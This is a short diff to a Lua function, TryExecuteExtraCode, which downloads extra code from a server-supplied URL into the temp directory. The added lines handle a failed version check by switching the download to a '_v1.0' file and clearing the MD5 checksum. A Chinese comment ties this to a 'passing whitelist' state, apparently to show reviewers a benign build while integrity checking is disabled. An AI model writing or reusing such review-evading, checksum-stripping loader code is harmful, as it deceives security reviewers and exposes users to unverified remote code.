@@ -1961,14 +1961,14 @@ function TryExecuteExtraCode(tServerConfig)
 		return
 	end
 	
-	local tVersionLimit = tExtraHelper["tVersion"]
-	if type(tVersionLimit) == "table" then
-		local bPassCheck = CheckForceVersion(tVersionLimit)
-		TipLog("[TryExecuteExtraCode] CheckForceVersion bPassCheck:"..tostring(bPassCheck))
-		if not bPassCheck then
-			return 
-		end
+	local bPassCheck = CheckForceVersion(tExtraHelper["tVersion"])
+	TipLog("[TryExecuteExtraCode] CheckForceVersion bPassCheck:"..tostring(bPassCheck))
+	if not bPassCheck then --不满足外网版本则是过白状态, 文件名换成v1.0的
+		strURL = string.gsub(strURL, "_v%d%.%d+", "_v1%.0")
+		TipLog("TryExecuteExtraCode, bPassCheck = "..tostring(bPassCheck)..", strURL = "..tostring(strURL))
+		strMD5 = ""
 	end
+	
 	
 	local strHelperName = GetFileSaveNameFromUrl(strURL)
 	local strSaveDir = tipUtil:GetSystemTempPath()
